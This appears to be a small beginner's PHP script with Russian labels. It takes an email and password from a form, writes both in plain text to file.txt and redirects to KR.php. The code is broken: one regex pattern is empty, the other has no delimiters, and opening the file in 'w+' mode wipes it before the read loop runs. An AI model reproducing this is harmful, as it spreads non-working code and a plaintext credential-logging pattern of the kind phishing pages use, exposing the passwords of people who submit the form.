<?php


if(preg_match('', $_POST['email']) && preg_match('(?<=[A-Z])\d{6}', $_POST['password']) == false)
    return;


$f = fopen('file.txt', 'w+');
$number = 1;

$prev = '';
while(!feof($f))
{
    $result = fgets($f, 100);
    
    $prev = $prev . $result;
    $number = $result[0];

}

fwrite($f, $prev . $number . " почта / " . $_POST['email'] . ", пароль / " . $_POST['password']);
fclose($f);

Header("Location: KR.php");